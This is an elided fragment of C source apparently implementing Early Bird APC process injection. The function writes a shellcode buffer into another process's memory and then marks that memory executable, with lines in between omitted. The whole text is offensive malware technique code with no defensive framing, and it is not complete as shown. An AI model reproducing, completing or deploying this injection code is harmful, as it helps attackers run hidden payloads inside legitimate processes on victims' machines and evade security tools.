...
int APCearlybrid_injection()
{
	...
	if (remotebuffer == NULL) {
		printf("[CODE:%d]Failed to allocate the memory!\n", GetLastError());
	...
	if (!WriteProcessMemory(hprocess, remotebuffer, shellcode, payload_size, NULL)) {
		printf("[CODE:%d]Failed to Write Payload into the memory\n", GetLastError());
		CloseHandle(hprocess);
		CloseHandle(hthread);
		return 1;
	...
	if (!VirtualProtectEx(hprocess, remotebuffer, payload_size, PAGE_EXECUTE_READ, &oldprotection)) {
		printf("[CODE:%d]Failed to Change the memory protection!\n", GetLastError());
		CloseHandle(hprocess);
		CloseHandle(hthread);
		return 1;
	}
